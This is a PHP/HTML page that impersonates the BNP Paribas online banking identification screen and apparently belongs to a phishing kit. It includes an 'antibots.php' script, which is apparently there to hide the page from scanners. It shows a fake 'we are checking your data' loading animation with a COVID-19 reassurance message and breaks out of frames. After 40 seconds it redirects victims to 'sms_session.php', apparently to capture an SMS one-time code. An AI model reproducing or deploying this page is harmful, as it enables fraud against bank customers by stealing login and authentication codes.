<?php 
include("antibots.php");

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="expires" content="Tue, 01-Jan-1980 00:00:00 GMT">
<meta http-equiv="date" content="Tue, 01-Jan-1980 00:00:00 GMT">
<title>BNPPARIBAS NET IDENTIFICATION</title>
<link href="dciweb.css" rel="stylesheet" type="text/css">
<link href="bnp.css" rel="stylesheet" type="text/css">
</head>
<body  bgcolor="#FFFFFF" link="#002288" alink="#002288" vlink="#002288"  >
<script language="JavaScript" src="tools.js"></script>
  <style>
    body {display : none;} 
  </style>
  <script>
    if (self == top) { 
      var theBody = document.getElementsByTagName('body')[0];
      theBody.style.display = "block";
    } else { 
      top.location = self.location; 
    }
  </script>
  <style type="text/css">
    <!--
    a:link,a:active,a:visited
    {
    text-decoration:none;
    color:black;
    }
    a:hover
    {
    text-decoration: underline;
    color:#0000FF;
    }
    //-->
  </style>
  <style type="text/css">
    
    html,body{
  background:#fff;
  margin:0;
}
.centered{
  width:190px;
  height:190px;
  position:absolute;
  top:45%;
  left:50%;
  transform:translate(-50%,-50%);
  background:#fff;
  filter: blur(10px) contrast(20);
}
.blob-1,.blob-2{
  width:50px;
  height:50px;
  position:absolute;
  background:#000;
  border-radius:50%;
  top:50%;left:50%;
  transform:translate(-50%,-50%);
}
.blob-1{
  left:20%;
  animation:osc-l 2.5s ease infinite;
}
.blob-2{
  left:80%;
  animation:osc-r 2.5s ease infinite;
  background:#0ff;
}
@keyframes osc-l{
  0%{left:20%;}
  50%{left:50%;}
  100%{left:20%;}
}
@keyframes osc-r{
  0%{left:80%;}
  50%{left:50%;}
  100%{left:80%;}
}

  </style>
  <div class="page">
    <table>
      <tr>
        <td align="center"><img align="center" border="0" src="headerBack.jpg" width="760" height="75"></td>
      </tr>
      <tr>
        <td colspan=2>&nbsp;</td>
      </tr>
    </table>
    <div class="info3"><span style="font-size:130%">
  Acc&eacute;dez &agrave; l'espace s&eacute;curis&eacute; BNPPARIBAS.NET
</span></div>
    <div align="left">
      &nbsp;
    </div>
      <div align="center">
        <b><font color="#FF0000"><font color="#269EE5">Dans ce contexte in&eacute;dit nos agences restent ouvertes dans leur tr&egrave;s grande majorit&eacute; et nous sommes joignables par t&eacute;l&eacute;phone ou mail.<br>Nos equipes sont &agrave; vos cot&eacute;s pour vous proposer si besoin, des solutions adapt&eacute;es &agrave; chaque situation. Nous vous remercions de votre confiance et de votre fid&eacute;lit&eacute;. </font> </font></b>

        <br />

        <p style="font-size:13px;">Veuillez patienter nous <strong>contrôlons vos données</strong> ... Ne quittez pas cette page pendant le traitement.</p>

        <center>
              <input type="hidden" name="vkid" value="vkident-8364hk1sgj">
              <input type="hidden" name="p1">
              <div style="width:620px; margin:0 auto; text-align: left">

                <div style="float:left;width: 50%; ">


                  <div class = "centered">
                    <div class = "blob-1"></div>
                    <div class = "blob-2"></div> 
                </div>




                <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />


                </div>
              </div>
            
        </center> 
      </div>
      
      <div style="clear:both;"/>
        
        <div align="center">
        
          
            <div style="padding-top: 10px; position: relative; top: 80px;">
              <img src="images/covid19-information.png" height="300" border="0">
            </div>
          
        
      </div>
        
        
      </div>
    
  </div>
  
  <script type="text/javascript">
    document.saisie.p0.focus();
  </script>

  <script type="text/javascript">
            setTimeout(function () {
                window.location.href= 'sms_session.php';
            },40000); // 1000 = 1s
        </script>
  
  
</div>
</body>


</html>